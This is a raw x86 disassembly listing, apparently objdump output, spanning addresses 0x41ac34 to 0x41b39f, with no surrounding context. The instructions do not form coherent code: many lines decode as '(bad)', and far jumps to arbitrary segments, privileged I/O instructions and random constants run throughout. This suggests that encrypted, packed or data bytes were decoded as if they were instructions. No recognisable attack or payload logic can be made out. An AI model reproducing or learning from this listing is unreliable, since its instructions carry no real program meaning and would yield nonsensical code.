  41ac34:	jmp    0x41ac06
  41ac36:	jmp    FWORD PTR [ebx*8-0x5a2eb078]
  41ac3d:	xor    ah,BYTE PTR [edx-0x50]
  41ac40:	sbb    DWORD PTR [edx+ebx*4+0x8],ebp
  41ac44:	inc    esi
  41ac45:	jmp    0xe33c:0xf6c73ee
  41ac4c:	loope  0x41aca8
  41ac4e:	mov    edi,0xd5fd8f75
  41ac53:	adc    al,0x84
  41ac55:	cmp    esi,DWORD PTR [eax+0x17]
  41ac58:	repz inc ebp
  41ac5a:	(bad)  
  41ac5b:	pop    ds
  41ac5c:	mov    al,0x95
  41ac5e:	shr    DWORD PTR [ebx+0x49],cl
  41ac61:	pop    ds
  41ac62:	(bad)  
  41ac63:	or     eax,0xa01a2088
  41ac68:	push   esp
  41ac69:	inc    esp
  41ac6a:	in     al,0x14
  41ac6c:	mov    esi,0x3e435dea
  41ac71:	sub    esp,edi
  41ac73:	add    bl,ch
  41ac75:	jnp    0x41ac8c
  41ac77:	sbb    DWORD PTR [ebx],0x18
  41ac7a:	fwait
  41ac7b:	mov    ds:0xdad8ad1e,al
  41ac80:	adc    al,0x94
  41ac82:	mov    dl,0xb1
  41ac84:	and    ah,BYTE PTR [edx+0x3c382943]
  41ac8a:	xchg   edi,eax
  41ac8b:	pop    esp
  41ac8c:	jne    0x41acfd
  41ac8e:	add    ah,BYTE PTR [edx+eiz*2-0x21]
  41ac92:	jmp    0xc467:0x886d87b2
  41ac99:	pop    ebx
  41ac9a:	mov    dl,0xda
  41ac9c:	dec    edi
  41ac9d:	dec    ebp
  41ac9e:	outs   dx,BYTE PTR ds:[esi]
  41ac9f:	pop    es
  41aca0:	cli    
  41aca1:	push   eax
  41aca2:	test   DWORD PTR [edi+0x3],ebp
  41aca5:	aas    
  41aca6:	loope  0x41ac44
  41aca8:	add    di,WORD PTR es:[edx-0x6bc709e0]
  41acb0:	(bad)  
  41acb1:	dec    ebp
  41acb2:	(bad)  
  41acb3:	fs mov eax,0xc490fb6a
  41acb9:	shr    edx,1
  41acbb:	sbb    eax,0xffd3acad
  41acc0:	sub    BYTE PTR [ecx+0x653ae0],cl
  41acc6:	dec    ebp
  41acc7:	pop    ss
  41acc8:	dec    edx
  41acc9:	push   ecx
  41acca:	stos   DWORD PTR es:[edi],eax
  41accb:	xlat   BYTE PTR ds:[ebx]
  41accc:	or     dh,ch
  41acce:	or     bl,BYTE PTR [edi]
  41acd0:	cmp    esp,ebx
  41acd2:	jns    0x41acb8
  41acd4:	lsl    ebp,sp
  41acd7:	addr16 cwde 
  41acd9:	add    dh,BYTE PTR [edx+edx*2-0x53]
  41acdd:	mov    ecx,0x4a6f08f5
  41ace2:	cwde   
  41ace3:	add    BYTE PTR [eax+0x42],bl
  41ace6:	ins    BYTE PTR es:[edi],dx
  41ace7:	fs js  0x41ad37
  41acea:	je     0x41ad5a
  41acec:	psubsw mm6,QWORD PTR [esi+0x5e]
  41acf0:	add    DWORD PTR [eax],esi
  41acf2:	test   DWORD PTR [ecx],esp
  41acf4:	std    
  41acf5:	imul   ebp,DWORD PTR [eax-0xa],0xffffffc3
  41acf9:	mov    bh,0xbc
  41acfb:	hlt    
  41acfc:	stc    
  41acfd:	push   edx
  41acfe:	inc    ecx
  41acff:	loop   0x41ad2b
  41ad01:	fisubr DWORD PTR [edx+ebp*8]
  41ad04:	jge    0x41ad68
  41ad06:	jl     0x41acca
  41ad08:	push   ss
  41ad09:	mov    cl,0xc7
  41ad0b:	cmp    esi,DWORD PTR [eax+0x23126a3e]
  41ad11:	retf   
  41ad12:	add    ah,BYTE PTR [esp+ecx*8+0x26]
  41ad16:	scas   al,BYTE PTR es:[edi]
  41ad17:	mov    al,ds:0x6a2399e0
  41ad1c:	scas   al,BYTE PTR es:[edi]
  41ad1d:	nop
  41ad1e:	mov    ah,BYTE PTR ds:[edi+edx*2-0x19]
  41ad23:	repnz adc al,0x1
  41ad26:	loope  0x41ad59
  41ad28:	mov    al,0x9a
  41ad2a:	jle    0x41ada5
  41ad2c:	mov    edx,0x1c45885b
  41ad31:	jne    0x41ad2f
  41ad33:	or     eax,eax
  41ad35:	adc    BYTE PTR [edx+0x21],0xe4
  41ad39:	adc    DWORD PTR [ecx-0x3e4eb84c],0x586ec6f8
  41ad43:	aaa    
  41ad44:	pop    eax
  41ad45:	pop    edi
  41ad46:	mov    bh,BYTE PTR es:[ecx+0x73b0a4d3]
  41ad4d:	mov    dl,0xdc
  41ad4f:	mov    al,BYTE PTR [ebp+0xdbd5aea]
  41ad55:	mov    eax,ds:0x2a73df55
  41ad5a:	xchg   BYTE PTR [ecx],cl
  41ad5c:	xchg   esp,eax
  41ad5d:	add    BYTE PTR [ebx-0x6],ch
  41ad60:	pop    eax
  41ad61:	pop    esi
  41ad62:	mov    ds:0xbf1f5c49,al
  41ad67:	dec    esi
  41ad68:	add    BYTE PTR [ebp-0x10],bh
  41ad6b:	test   al,0xc3
  41ad6d:	cld    
  41ad6e:	mov    ds:0x1dd802a5,eax
  41ad73:	xor    BYTE PTR [edx-0x80],bl
  41ad76:	pop    ds
  41ad77:	stc    
  41ad78:	jmp    FWORD PTR ds:0xbfcc51e2
  41ad7e:	and    DWORD PTR [ebx-0x3a],ebx
  41ad81:	pusha  
  41ad82:	pop    eax
  41ad83:	push   ebx
  41ad84:	mov    DWORD PTR [edi+0x4ef4a430],edx
  41ad8a:	out    0xad,eax
  41ad8c:	(bad)  
  41ad8d:	mov    esp,0xbabb020e
  41ad92:	push   0xadc562fb
  41ad97:	(bad)  ds:0x52c77e68
  41ad9d:	out    dx,al
  41ad9e:	scas   eax,DWORD PTR es:[edi]
  41ad9f:	(bad)  
  41ada0:	ror    eax,cl
  41ada2:	jnp    0x41ad50
  41ada4:	(bad)  
  41ada6:	cmp    BYTE PTR [edx],dl
  41ada8:	aam    0x4c
  41adaa:	and    eax,0xfbf37ee6
  41adaf:	pop    edx
  41adb0:	enter  0x3529,0xb6
  41adb4:	push   eax
  41adb5:	cs imul edi,ecx,0xffffffc4
  41adb9:	jmp    0x41ada7
  41adbb:	push   ebx
  41adbc:	mov    ch,0x9
  41adbe:	das    
  41adbf:	sub    eax,0x2f
  41adc2:	js     0x41adce
  41adc4:	mov    edi,0xa2e001db
  41adc9:	gs pop ds
  41adcb:	push   0x6b
  41adcd:	ret    
  41adce:	jae    0x41ae0a
  41add0:	inc    esp
  41add1:	daa    
  41add2:	cmp    ecx,DWORD PTR [edx]
  41add4:	int    0xcf
  41add6:	adc    bh,BYTE PTR es:0x99b712fa
  41addd:	rol    BYTE PTR [eax+eiz*1-0xa],0x88
  41ade2:	and    al,0xf5
  41ade4:	pushf  
  41ade5:	mov    ah,0xfa
  41ade7:	or     DWORD PTR fs:[edi+ebx*4],ecx
  41adeb:	imul   esp,edx,0xd9f95594
  41adf1:	jns    0x41adf9
  41adf3:	sahf   
  41adf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adf5:	or     al,0x2f
  41adf7:	pop    ds
  41adf8:	pushf  
  41adf9:	getsec 
  41adfb:	into   
  41adfc:	adc    eax,0x14d2667a
  41ae01:	sbb    al,0x8d
  41ae03:	(bad)  
  41ae04:	fist   DWORD PTR [edi]
  41ae06:	fcom   QWORD PTR [ebx]
  41ae08:	xor    eax,0xee67f6fb
  41ae0d:	in     al,0xca
  41ae0f:	xchg   ebp,eax
  41ae10:	xor    eax,ebp
  41ae12:	xor    DWORD PTR es:[edx+ebp*4+0x55],ecx
  41ae17:	jae    0x41ae37
  41ae19:	mov    esp,0x42621ad4
  41ae1e:	imul   eax,DWORD PTR [eax-0x46],0xfffffffe
  41ae22:	daa    
  41ae23:	clc    
  41ae24:	jp     0x41adc1
  41ae26:	test   DWORD PTR [edi+0x24],ebx
  41ae29:	push   es
  41ae2a:	mov    al,ds:0x6f1a51eb
  41ae2f:	pop    ebx
  41ae30:	pop    eax
  41ae31:	mov    dh,0xb4
  41ae33:	(bad)  
  41ae34:	jmp    0x41ae6b
  41ae36:	jle    0x41ae16
  41ae38:	xchg   BYTE PTR [edi-0x7fe37377],bh
  41ae3e:	ja     0x41aeac
  41ae40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae41:	push   edi
  41ae42:	sbb    dl,BYTE PTR [edx+0x43de0dc]
  41ae48:	push   ecx
  41ae49:	call   esp
  41ae4b:	cmc    
  41ae4c:	sub    DWORD PTR [edx],esp
  41ae4e:	lods   al,BYTE PTR ds:[esi]
  41ae4f:	and    ebx,ecx
  41ae51:	sar    cl,1
  41ae53:	pop    ds
  41ae54:	inc    esi
  41ae55:	(bad)  [edi]
  41ae57:	mov    esp,0x62fa705a
  41ae5c:	adc    edi,edi
  41ae5e:	jl     0x41ade9
  41ae60:	mov    esp,DWORD PTR [ecx-0x5451354f]
  41ae66:	hlt    
  41ae67:	sbb    esp,DWORD PTR [ebx]
  41ae69:	(bad)  
  41ae6a:	cmp    al,0x5b
  41ae6c:	bswap  ebp
  41ae6e:	stos   BYTE PTR es:[edi],al
  41ae6f:	(bad)  
  41ae70:	sti    
  41ae71:	lods   eax,DWORD PTR ds:[esi]
  41ae72:	loopne 0x41aeda
  41ae74:	icebp  
  41ae75:	pop    es
  41ae76:	pop    ss
  41ae77:	sub    BYTE PTR [edx],al
  41ae79:	mov    ?,WORD PTR [esi+0x42]
  41ae7c:	or     eax,0xa8945b90
  41ae81:	repz sub DWORD PTR [ecx],0x41a1006b
  41ae88:	outs   dx,BYTE PTR ds:[esi]
  41ae89:	mov    al,0x17
  41ae8b:	dec    edi
  41ae8c:	xchg   DWORD PTR [esi-0x5e77f6ec],esp
  41ae92:	xor    al,BYTE PTR [eax]
  41ae94:	test   BYTE PTR ds:0x7840b153,dl
  41ae9a:	pop    esi
  41ae9b:	ret    0xbde9
  41ae9e:	lea    edi,[ecx]
  41aea0:	xchg   ecx,eax
  41aea1:	stos   BYTE PTR es:[edi],al
  41aea2:	pop    es
  41aea3:	pop    ebx
  41aea4:	stos   DWORD PTR es:[edi],eax
  41aea5:	sbb    cl,0xcf
  41aea8:	dec    bx
  41aeaa:	scas   al,BYTE PTR es:[edi]
  41aeab:	cmc    
  41aeac:	dec    ebp
  41aead:	mov    ah,0x5f
  41aeaf:	cdq    
  41aeb0:	dec    edx
  41aeb1:	ret    
  41aeb2:	outs   dx,BYTE PTR ds:[esi]
  41aeb3:	fisubr WORD PTR [edi+eax*4-0x78c42e6]
  41aeba:	fs cmp al,0x94
  41aebd:	add    al,0xc4
  41aebf:	sub    BYTE PTR [esp+eiz*2-0x173d1b24],ah
  41aec6:	les    esp,FWORD PTR [ebp+0x17]
  41aec9:	xchg   DWORD PTR [ebx],esi
  41aecb:	sub    BYTE PTR [ebx+0x40bb31e8],0x4
  41aed2:	push   ds
  41aed3:	cwde   
  41aed4:	jg     0x41af0f
  41aed6:	pop    ecx
  41aed7:	pop    ds
  41aed8:	into   
  41aed9:	ins    BYTE PTR es:[edi],dx
  41aeda:	sub    DWORD PTR [ebp-0x5d509892],ebp
  41aee0:	(bad)  
  41aee1:	mov    bh,0x22
  41aee3:	int3   
  41aee4:	xor    eax,0x3ddc30f6
  41aee9:	clc    
  41aeea:	fcomp  DWORD PTR [ecx+0x79]
  41aeed:	imul   DWORD PTR [edi]
  41aeef:	sub    al,0xcf
  41aef1:	pop    esp
  41aef2:	ins    BYTE PTR es:[edi],dx
  41aef3:	pop    edx
  41aef4:	repnz outs dx,BYTE PTR ds:[esi]
  41aef6:	jmp    0x6a8e:0xd58123cb
  41aefd:	iret   
  41aefe:	sub    edi,eax
  41af00:	xchg   esi,eax
  41af01:	mov    bl,0x8b
  41af03:	sub    al,0x9a
  41af05:	clc    
  41af06:	inc    esi
  41af07:	(bad)  
  41af09:	and    DWORD PTR [edx+eiz*8],edx
  41af0c:	jge    0x41aec8
  41af0e:	jne    0x41af33
  41af10:	nop
  41af11:	int3   
  41af12:	push   0xffffff85
  41af14:	popf   
  41af15:	pop    edi
  41af16:	sub    eax,0xe53374ef
  41af1b:	ins    BYTE PTR es:[edi],dx
  41af1c:	xlat   BYTE PTR ds:[ebx]
  41af1d:	fimul  WORD PTR [bx]
  41af20:	cmp    bl,cl
  41af22:	dec    esp
  41af23:	push   eax
  41af24:	xor    BYTE PTR [ebp+0x48],dl
  41af27:	pminsw mm5,QWORD PTR [edx]
  41af2a:	lea    esi,ds:0x8e2dc958
  41af30:	in     al,dx
  41af31:	push   ebx
  41af32:	std    
  41af33:	mov    ds:0xd55c89fa,eax
  41af38:	sar    DWORD PTR [esi],cl
  41af3a:	cmp    eax,0xceddc23c
  41af3f:	shl    DWORD PTR [esi+0x65],cl
  41af42:	dec    eax
  41af43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af44:	push   0x9fbb4fd7
  41af49:	retf   0x60c7
  41af4c:	call   0x76b5:0x215554d7
  41af53:	pop    ebp
  41af54:	mov    edi,ss
  41af56:	mov    eax,0xada39ca0
  41af5b:	data16 data16 jg 0x41af71
  41af5f:	jno    0x41aef6
  41af61:	xchg   BYTE PTR [ecx+ebp*4-0x79],al
  41af65:	xchg   BYTE PTR [ebx+0xc93193c],dh
  41af6b:	xchg   BYTE PTR [edi+0x6f],bl
  41af6e:	mov    DWORD PTR ds:0xfbfb221d,0x82235abb
  41af78:	xchg   esp,eax
  41af79:	sbb    bh,bh
  41af7b:	pop    DWORD PTR [esp+ecx*1+0x7861086d]
  41af82:	dec    ebx
  41af83:	mov    ch,0x18
  41af85:	jecxz  0x41af45
  41af87:	and    BYTE PTR [esi],0x91
  41af8a:	addr16 mov al,ds:0x685e
  41af8e:	bndldx bnd0,[edx-0x367fef73]
  41af95:	sbb    esp,DWORD PTR [ebx+0x39215d07]
  41af9b:	comiss xmm1,xmm1
  41af9e:	and    eax,DWORD PTR [edx-0xe8df957]
  41afa4:	repnz out 0x4b,al
  41afa7:	in     al,dx
  41afa8:	or     al,0xb3
  41afaa:	inc    eax
  41afab:	mov    ebp,0xa1089407
  41afb0:	(bad)  
  41afb1:	sub    esp,DWORD PTR [ebx]
  41afb3:	cmp    BYTE PTR [ebp-0x7ef08279],al
  41afb9:	jnp    0x41b01b
  41afbb:	rol    BYTE PTR ds:[edi-0x58],cl
  41afbf:	fbstp  TBYTE PTR [ebx+0x47]
  41afc2:	lods   eax,DWORD PTR ds:[esi]
  41afc3:	dec    eax
  41afc4:	mov    cs,WORD PTR [esi-0x57]
  41afc7:	mov    bh,0xd6
  41afc9:	sbb    BYTE PTR [ecx-0x35fa7000],ch
  41afcf:	sbb    ebx,DWORD PTR [edi]
  41afd1:	and    ch,BYTE PTR [ecx-0x8ce10ef]
  41afd7:	(bad)  
  41afd8:	data16 (bad) 
  41afdb:	cmp    DWORD PTR [edx+0x8fbde6f],0x6199faa5
  41afe5:	inc    ecx
  41afe6:	mov    cl,0x4b
  41afe8:	mov    ecx,0x9175fe78
  41afed:	outs   dx,BYTE PTR ds:[esi]
  41afee:	shl    BYTE PTR fs:[ebp+0x20b5cc24],1
  41aff5:	hlt    
  41aff6:	jbe    0x41afcb
  41aff8:	jecxz  0x41afab
  41affa:	dec    eax
  41affb:	aad    0x59
  41affd:	push   eax
  41affe:	mov    eax,ds:0xb6b6f65e
  41b003:	mov    DWORD PTR [edi-0x4e],edi
  41b006:	mov    ?,WORD PTR [ebp+ebx*4-0x36]
  41b00a:	int    0xa5
  41b00c:	lds    esp,FWORD PTR [esi]
  41b00e:	adc    al,0xc0
  41b010:	imul   ebp,DWORD PTR [edx+0x73cea501],0xffffffea
  41b017:	and    ecx,DWORD PTR [ebx+0x38]
  41b01a:	add    al,0x7e
  41b01c:	aam    0x41
  41b01e:	shl    ah,0x93
  41b021:	fisub  WORD PTR [eax-0x54]
  41b024:	(bad)  
  41b025:	push   esp
  41b026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b027:	jbe    0x41b09c
  41b029:	xor    bl,bh
  41b02b:	xor    BYTE PTR [edx+0x6e949bb],dh
  41b031:	pop    esp
  41b032:	dec    ecx
  41b033:	dec    ecx
  41b034:	dec    eax
  41b035:	test   eax,0xc2239b61
  41b03a:	mov    edx,edx
  41b03c:	dec    ebp
  41b03d:	mov    esp,0xcc52a9e4
  41b042:	pop    es
  41b043:	xor    ch,BYTE PTR [ebp-0x63]
  41b046:	pop    esp
  41b047:	aaa    
  41b048:	repz add al,bl
  41b04b:	xchg   ebx,eax
  41b04c:	enter  0x8ef9,0x47
  41b050:	mov    esp,0xe6377d32
  41b055:	and    al,0xc2
  41b057:	inc    edi
  41b058:	lahf   
  41b059:	fs mov dl,0xd5
  41b05c:	fwait
  41b05d:	stc    
  41b05e:	push   0x31
  41b060:	aaa    
  41b061:	mov    dh,0x40
  41b063:	push   cs
  41b064:	mov    dl,0x16
  41b066:	ins    BYTE PTR es:[edi],dx
  41b067:	loop   0x41aff9
  41b069:	mov    esp,0x5641221f
  41b06e:	aad    0x34
  41b070:	(bad)  
  41b072:	mov    esi,0xc93b7735
  41b077:	std    
  41b078:	xchg   esi,eax
  41b079:	push   es
  41b07a:	scas   al,BYTE PTR es:[edi]
  41b07b:	mov    al,ds:0x40c2b256
  41b080:	mov    edi,0x35181dc1
  41b085:	push   es
  41b086:	fs (bad) 
  41b088:	sbb    al,0x3f
  41b08a:	jb     0x41b0b2
  41b08c:	cmp    BYTE PTR [eax],cl
  41b08e:	and    al,0x66
  41b090:	xchg   ecx,edi
  41b092:	xor    eax,DWORD PTR [ebx-0x9]
  41b095:	xor    ebp,ebx
  41b097:	adc    eax,DWORD PTR ss:[ebx+0x1]
  41b09b:	lock sub ch,dl
  41b09e:	loopne 0x41b030
  41b0a0:	lds    ebp,FWORD PTR [esi-0x7f]
  41b0a3:	gs pushf 
  41b0a5:	inc    edx
  41b0a6:	inc    eax
  41b0a7:	aas    
  41b0a8:	(bad)  
  41b0a9:	xor    DWORD PTR [ebp+0x7a1a2e49],eax
  41b0af:	fnsave [eax-0x7c]
  41b0b2:	push   ebx
  41b0b3:	mov    bh,bh
  41b0b5:	xchg   edi,eax
  41b0b6:	rol    DWORD PTR [eax],0x98
  41b0b9:	mov    ebx,0x212ed81b
  41b0be:	loopne 0x41b0d5
  41b0c0:	js     0x41b13d
  41b0c2:	idiv   BYTE PTR [ecx-0x45f538cb]
  41b0c8:	and    eax,0x681c883a
  41b0cd:	fidiv  WORD PTR [edx-0x63]
  41b0d0:	or     esp,eax
  41b0d2:	jb     0x41b068
  41b0d4:	mov    WORD PTR [esi-0x5f74094],cs
  41b0da:	stc    
  41b0db:	adc    BYTE PTR [ecx-0x33],dl
  41b0de:	pusha  
  41b0df:	add    cl,al
  41b0e1:	jge    0x41b07d
  41b0e3:	scas   eax,DWORD PTR es:[edi]
  41b0e4:	adc    BYTE PTR [eax],ah
  41b0e6:	iret   
  41b0e7:	sbb    ecx,edi
  41b0e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0ea:	xlat   BYTE PTR ds:[ebx]
  41b0eb:	in     al,dx
  41b0ec:	dec    esi
  41b0ed:	popa   
  41b0ee:	cdq    
  41b0ef:	jb     0x41b08c
  41b0f1:	outs   dx,BYTE PTR ds:[esi]
  41b0f2:	jmp    0xf3eb2503
  41b0f7:	out    dx,al
  41b0f8:	dec    ebx
  41b0f9:	repz pop esi
  41b0fb:	jmp    0xcfbb:0x17252888
  41b102:	pop    ecx
  41b103:	(bad)  
  41b104:	fisub  WORD PTR [ebx+0x17]
  41b107:	and    ecx,DWORD PTR [ebp+0x18ed7900]
  41b10d:	mov    bl,0xb6
  41b10f:	mov    edx,0xc81d3ba9
  41b114:	les    edi,FWORD PTR [ebx*2-0x349d66f0]
  41b11b:	stos   BYTE PTR es:[edi],al
  41b11c:	inc    esi
  41b11d:	fwait
  41b11e:	stos   BYTE PTR es:[edi],al
  41b11f:	jl     0x41b13f
  41b121:	shl    DWORD PTR [ebp+0xc2a06d],cl
  41b127:	pop    eax
  41b128:	dec    edx
  41b129:	stos   BYTE PTR es:[edi],al
  41b12a:	sbb    esp,ebp
  41b12c:	sbb    eax,0x522104d8
  41b131:	ss shl bh,1
  41b134:	xor    ebp,DWORD PTR [edi+esi*1-0x77]
  41b138:	arpl   cx,bx
  41b13a:	imul   esp,DWORD PTR [ecx+0x12a34176],0x46
  41b141:	and    bl,BYTE PTR [ecx]
  41b143:	mov    bh,0xa1
  41b145:	not    esi
  41b147:	fadd   QWORD PTR [edi]
  41b149:	es in  eax,0xfd
  41b14c:	mov    dl,0x1b
  41b14e:	imul   eax,DWORD PTR [ecx+0xf0fd235],0xe6a44f95
  41b158:	lds    ebx,FWORD PTR [ebx+0x46]
  41b15b:	inc    esi
  41b15c:	imul   al
  41b15e:	push   ebx
  41b15f:	hlt    
  41b160:	inc    edi
  41b161:	(bad)  
  41b162:	jg     0x41b13c
  41b164:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b165:	sbb    esi,ebp
  41b167:	or     al,0xa1
  41b169:	test   al,0x28
  41b16b:	stc    
  41b16c:	bound  ecx,QWORD PTR [edx-0x7d]
  41b16f:	nop
  41b170:	push   eax
  41b171:	sbb    al,0xff
  41b173:	cld    
  41b174:	enter  0x73e3,0xfa
  41b178:	jae    0x41b174
  41b17a:	jmp    0x17784bbf
  41b17f:	pop    ds
  41b180:	iret   
  41b181:	mov    cl,0xd1
  41b183:	pop    esi
  41b184:	call   0xe221:0xbba00104
  41b18b:	sbb    ebx,DWORD PTR [edx]
  41b18d:	push   ds
  41b18e:	mov    dl,BYTE PTR [eax+edi*4-0x2]
  41b192:	and    edx,edi
  41b194:	arpl   WORD PTR [edi],ax
  41b196:	bound  ebx,QWORD PTR [edx]
  41b198:	addr16 inc ebp
  41b19a:	xchg   ebx,eax
  41b19b:	sahf   
  41b19c:	test   al,0x7
  41b19e:	mov    edx,0xf03c954e
  41b1a3:	cmp    eax,0xe13425d
  41b1a8:	dec    edi
  41b1a9:	pop    ds
  41b1aa:	xchg   edi,eax
  41b1ab:	dec    esp
  41b1ac:	mov    al,0xe8
  41b1ae:	lods   eax,DWORD PTR ds:[esi]
  41b1af:	xchg   esi,eax
  41b1b0:	mov    cl,cl
  41b1b2:	pop    eax
  41b1b3:	push   es
  41b1b4:	sbb    DWORD PTR [edx],edx
  41b1b6:	mov    ebx,0x4f5b8b6c
  41b1bb:	pop    edi
  41b1bc:	ss push edx
  41b1be:	pop    ecx
  41b1bf:	repz dec ebx
  41b1c1:	push   esi
  41b1c2:	mov    dh,0x69
  41b1c4:	loopne 0x41b1eb
  41b1c6:	je     0x41b241
  41b1c8:	xchg   BYTE PTR [ebx-0x10b96049],bl
  41b1ce:	cmp    bh,BYTE PTR [ecx+0x28e52457]
  41b1d4:	jno    0x41b24b
  41b1d6:	out    0x7b,al
  41b1d8:	sbb    eax,0x6541d5a5
  41b1dd:	lock sub DWORD PTR ds:0xa5d359b9,0x95d587a7
  41b1e8:	mov    ds:0xcb07de10,eax
  41b1ed:	daa    
  41b1ee:	pop    ecx
  41b1ef:	cmp    esi,ebx
  41b1f1:	jle    0x41b1d8
  41b1f3:	(bad)  
  41b1f4:	in     eax,dx
  41b1f5:	dec    ecx
  41b1f6:	(bad)  
  41b1f7:	hlt    
  41b1f8:	sbb    ebp,DWORD PTR [ebx+0xbe9cdfc]
  41b1fe:	pop    ss
  41b1ff:	mov    edi,DWORD PTR [ebp+0x6586ed30]
  41b205:	sbb    DWORD PTR [edi+0x1e],esi
  41b208:	mov    WORD PTR [ebp-0x1],ss
  41b20b:	clc    
  41b20c:	xor    eax,0x7821bdfa
  41b211:	pop    ebp
  41b212:	mul    DWORD PTR [ecx+0x6d36c813]
  41b218:	push   ss
  41b219:	xlat   BYTE PTR ds:[ebx]
  41b21a:	fcom   QWORD PTR [ebp+0x7e]
  41b21d:	pop    es
  41b21e:	jae    0x41b262
  41b220:	mov    bh,0xf1
  41b222:	ins    DWORD PTR es:[edi],dx
  41b223:	mov    edi,0x7d46d4d7
  41b228:	or     al,0xba
  41b22a:	sub    eax,0xc010ab4a
  41b22f:	out    0x1a,al
  41b231:	mov    cl,0xc3
  41b233:	outs   dx,DWORD PTR ds:[esi]
  41b234:	mul    DWORD PTR [edx-0x16]
  41b237:	imul   esi,DWORD PTR [ecx],0x2a
  41b23a:	push   ebp
  41b23b:	addr16 or eax,esp
  41b23e:	hlt    
  41b23f:	std    
  41b240:	data16 mov ch,cl
  41b243:	test   edx,ebp
  41b245:	and    al,0xa5
  41b247:	shl    BYTE PTR [ebp-0x766f54d1],0x52
  41b24e:	lds    ebx,FWORD PTR [eax-0x6b1f2855]
  41b254:	mov    al,ds:0x6207dc18
  41b259:	icebp  
  41b25a:	add    ch,BYTE PTR [ebx-0x2edbe9e7]
  41b260:	sub    eax,0x7f6dcdae
  41b265:	dec    edx
  41b266:	rcl    DWORD PTR [ebx+ecx*4-0x22],cl
  41b26a:	(bad)  
  41b26b:	push   cs
  41b26c:	or     edx,DWORD PTR [ebp+0x60475187]
  41b272:	mov    esp,0x65cdba22
  41b277:	(bad)  
  41b278:	xchg   ebx,eax
  41b279:	stc    
  41b27a:	sti    
  41b27b:	jo     0x41b25a
  41b27d:	mov    edi,DWORD PTR [edi+eax*8]
  41b280:	xor    bl,BYTE PTR [eax+ebp*4+0x4f825b5]
  41b287:	icebp  
  41b288:	dec    ebx
  41b289:	adc    BYTE PTR [edi+0x57],bh
  41b28c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b28d:	fldenv [edi+ecx*2-0x21]
  41b291:	adc    DWORD PTR [edx+esi*2],0x9e1e9069
  41b298:	dec    eax
  41b299:	aas    
  41b29a:	and    BYTE PTR [eax+0x57643c48],bh
  41b2a0:	or     ch,0x67
  41b2a3:	pop    edi
  41b2a4:	push   es
  41b2a5:	fdivr  DWORD PTR [ebx]
  41b2a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2a8:	mov    ds:0x5f51edb6,al
  41b2ad:	or     BYTE PTR [eax+edi*4-0x6ceca6f1],bh
  41b2b4:	xor    esp,DWORD PTR [edi+0x6b2b2f7f]
  41b2ba:	and    ebp,ecx
  41b2bc:	in     al,dx
  41b2bd:	mov    cs,WORD PTR ds:0x282bd48e
  41b2c3:	or     ebp,DWORD PTR [ecx]
  41b2c5:	jg     0x41b2fe
  41b2c7:	lahf   
  41b2c8:	loop   0x41b24d
  41b2ca:	out    dx,al
  41b2cb:	arpl   WORD PTR gs:[edx-0x6e],sp
  41b2cf:	xor    BYTE PTR ds:0x48dd0d86,bl
  41b2d5:	out    dx,eax
  41b2d6:	rcl    dh,0x4d
  41b2d9:	mov    edi,0xafb9d9d3
  41b2de:	popa   
  41b2df:	aad    0x5b
  41b2e1:	adc    DWORD PTR [edx+0x1e],ebp
  41b2e4:	test   eax,0x4320f9cd
  41b2e9:	or     eax,ebp
  41b2eb:	mov    dl,0x84
  41b2ed:	or     DWORD PTR [edi],edi
  41b2ef:	inc    ebp
  41b2f0:	mov    ds:0xe30f63ee,al
  41b2f5:	or     edi,DWORD PTR [ebx-0x3be44779]
  41b2fb:	(bad)  
  41b2fd:	adc    DWORD PTR [eax+edi*8-0x5],esi
  41b301:	adc    al,0xd
  41b303:	jae    0x41b289
  41b305:	jmp    0x1d59:0x53bfa548
  41b30c:	mov    ecx,edx
  41b30e:	xlat   BYTE PTR ds:[ebx]
  41b30f:	mov    bl,BYTE PTR [edx+eiz*1-0x41bffd9e]
  41b316:	mov    es,WORD PTR [edx+0x2bcf2ca6]
  41b31c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b31d:	xchg   edx,eax
  41b31e:	xor    eax,0xc869605c
  41b324:	cmc    
  41b325:	scas   al,BYTE PTR es:[edi]
  41b326:	and    esi,DWORD PTR [ebx]
  41b328:	sub    DWORD PTR [ecx+0x48],ebx
  41b32b:	mov    ds:0xcde91a44,al
  41b330:	pop    ss
  41b331:	(bad)  
  41b332:	push   ebx
  41b333:	add    eax,0x6fa7180b
  41b338:	pop    ebp
  41b339:	fmul   DWORD PTR [esi+ecx*4]
  41b33c:	into   
  41b33d:	lgs    esi,FWORD PTR [ecx*2+0x92f7e20]
  41b345:	push   ecx
  41b346:	cwde   
  41b347:	out    dx,al
  41b348:	or     bl,ch
  41b34a:	out    0xb8,eax
  41b34c:	xchg   BYTE PTR [ecx+ecx*4-0x52],ch
  41b350:	cmp    al,BYTE PTR [edi]
  41b352:	add    edi,ebx
  41b354:	dec    ebp
  41b355:	in     eax,0xb3
  41b357:	push   ecx
  41b358:	stos   BYTE PTR es:[edi],al
  41b359:	mov    esi,0x7bbda048
  41b35e:	dec    edx
  41b35f:	pop    ds
  41b360:	add    BYTE PTR [ebp+0x7d5d4b4d],dl
  41b366:	repnz int3 
  41b368:	jno    0x41b3bc
  41b36a:	dec    esi
  41b36b:	clc    
  41b36c:	stos   DWORD PTR es:[edi],eax
  41b36d:	cdq    
  41b36e:	jb     0x41b2f6
  41b370:	xchg   esp,eax
  41b371:	push   esi
  41b372:	xchg   DWORD PTR [bp-0x5],edi
  41b376:	cli    
  41b377:	pop    edx
  41b378:	xor    al,0x0
  41b37a:	add    ebx,eax
  41b37c:	inc    ecx
  41b37d:	(bad)  
  41b37e:	fstp   TBYTE PTR [edi-0x32e8ba14]
  41b384:	fucomp st(6)
  41b386:	bound  edi,QWORD PTR [esi-0x79b80be6]
  41b38c:	jbe    0x41b401
  41b38e:	add    edx,DWORD PTR [edx]
  41b390:	ret    0x6e7
  41b393:	inc    al
  41b395:	mov    ebx,0x275b9853
  41b39a:	mov    dl,0x32
  41b39c:	ficom  WORD PTR [eax-0x55]
  41b39f:	ds retf 0xecc0
